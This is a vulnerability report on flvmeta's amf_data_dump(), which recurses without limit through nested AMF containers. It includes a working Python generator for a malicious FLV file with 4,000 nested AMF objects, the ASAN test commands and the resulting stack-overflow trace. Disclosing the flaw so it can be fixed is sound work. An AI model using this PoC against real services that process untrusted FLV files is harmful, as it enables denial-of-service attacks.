## Bug0: Uncontrolled Recursion in amf_data_dump Causes Stack Overflow

`amf_data_dump()` in `amf.c` (called from `dump_raw.c:124`) imposes no recursion depth limit when traversing nested AMF containers, and each stack frame reserves a 128-byte `datestr` local buffer, so a crafted FLV script tag with roughly 4,000 levels of nested AMF objects exhausts the default 8 MB Linux stack and crashes the process.

### PoC

Craft a malicious FLV file using the Python script below and process it with the ASAN-instrumented flvmeta binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
"""
PoC generator: Uncontrolled Recursion in amf_data_dump
CWE-674: Uncontrolled Recursion

Crafts a FLV file with a Script Tag containing deeply nested AMF objects
to trigger stack exhaustion in amf_data_dump() during the dump phase.
"""

import struct

OUTPUT = "poc_input.flv"
DEPTH = 4000  # Each amf_data_dump frame allocates 128-byte datestr; 4000 levels overflow

# ---- Build deeply nested AMF structure (iterative, no Python recursion) ----

# Innermost value: AMF number 1.0
inner = b"\x00" + struct.pack(">d", 1.0)

# Wrap in DEPTH levels of AMF objects
# AMF object: 0x03 + key-value pairs + 0x00 0x00 0x09 (end marker)
# Key format: uint16 BE length + bytes (no type byte for key)
# Value format: type byte + data
for i in range(DEPTH):
    key = b"\x00\x01" + b"a"  # key "a", length 1
    inner = b"\x03" + key + inner + b"\x00\x00\x09"

# Outermost "onMetaData" ecma_array wrapping
# AMF ecma_array: 0x08 + uint32 BE count + key-value pairs + 0x00 0x00 0x09
key_outer = b"\x00\x04" + b"meta"
amf_body = b"\x08" + struct.pack(">I", 1) + key_outer + inner + b"\x00\x00\x09"

# Full AMF data for script tag
# AMF string: 0x02 + uint16 BE length + bytes
amf_name = b"\x02" + struct.pack(">H", 10) + b"onMetaData"
tag_data = amf_name + amf_body

# ---- Assemble FLV file ----

# FLV header: signature + version 1 + flags (audio+video) + header size 9
flv_header = b"FLV" + b"\x01" + b"\x05" + b"\x00\x00\x00\x09"

# Previous tag size before first tag = 0
prev_tag_size_0 = b"\x00\x00\x00\x00"

# Script tag (type 0x12 = 18)
tag_type = b"\x12"
data_size = len(tag_data)
tag_data_size = struct.pack(">I", data_size)[1:]  # 3 bytes BE
timestamp = b"\x00\x00\x00"
timestamp_extended = b"\x00"
stream_id = b"\x00\x00\x00"

script_tag = (
    tag_type
    + tag_data_size
    + timestamp
    + timestamp_extended
    + stream_id
    + tag_data
)

# Previous tag size = 11 (tag header) + data_size
prev_tag_size_1 = struct.pack(">I", 11 + data_size)

flv_bytes = flv_header + prev_tag_size_0 + script_tag + prev_tag_size_1

# ---- Write output ----
with open(OUTPUT, "wb") as f:
    f.write(flv_bytes)

print(f"[+] Written {len(flv_bytes)} bytes to {OUTPUT}")
print(f"[+] AMF nesting depth: {DEPTH}")
print(f"[+] Expected crash: stack overflow in amf_data_dump() during dump phase")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/src/flvmeta poc_input.flv || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: stack-overflow on address 0x7ffc848efff8 (pc 0x7f2c91fe0660 bp 0x7f2c92170780 sp 0x7ffc848f0000 T0)
    #0 0x7f2c91fe0660 in _IO_new_file_xsputn libio/fileops.c:1235
    #1 0x7f2c91fe0660 in _IO_new_file_xsputn libio/fileops.c:1196

### Impact

An attacker who supplies a crafted FLV file with approximately 4,000 levels of nested AMF objects can cause flvmeta to exhaust its stack during the metadata dump phase, producing an unconditional denial of service via SIGSEGV. The attack surface covers any pipeline or service that invokes flvmeta on untrusted FLV input, and no authentication or special privilege is required. On builds without stack canaries or guard pages, the uncontrolled stack growth may overwrite adjacent memory regions and could potentially lead to arbitrary code execution.
